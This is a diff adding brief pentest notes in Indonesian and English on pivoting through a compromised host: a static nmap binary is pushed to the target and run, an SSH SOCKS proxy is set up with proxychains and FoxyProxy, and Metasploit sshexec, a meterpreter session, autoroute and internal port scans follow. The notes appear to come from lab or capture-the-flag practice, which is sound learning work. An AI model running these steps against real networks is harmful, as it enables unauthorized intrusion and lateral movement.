@@ -1,0 +1,57 @@
+
+
+pivot
+
+static
+-> download nmap binary di github and kirim ke mesin target 
+-> https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap
+-> chmod +x nmap
+-> ./nmap -p- 192.168.1.106 -oN scan.nmap --min-rate 1000
+
+"notes"
+static binary ga bisa pakai -sCV karna script engine nya gak ada 
+
+
+dynamic
+-> ssh -D 2108 namamesin@10.1.2.20
+-> sudo apt install proxychains
+-> sudo nano /etc/proxychains.conf (uncomment socks5 nya dan masukkan ip tadi "2108")
+   socks5 127.0.0.1 2108
+-> proxychains nmap 192.168.1.106
+-> proxychains nmap -sCV 192.168.1.106 -p 80
+
+
+
+"notes"
+untuk akses mesin port yang terbuka di browser, pakai foxyproxy
+
+foxyproxy
+title -> nama mesin aja 
+proxy type -> socks5
+proxy ip address -> 127.0.0.1
+port -> 2108
+
+
+* metasploit *
+-> msfconsole
+-> search sshexec
+-> use 0
+-> options
+-> set password (password nya)
+-> set username (nama user nya)
+-> set rhosts 10.1.2.20
+-> set lhost tun0
+-> run
+
+
+'meterpreter session open'
+
+-> ifconfig
+-> run autoroute -p
+-> bg 'background'
+-> search portscan 
+-> use 5
+-> options 
+-> set rhosts 192.168.1.106
+-> set threads 1000
+-> run
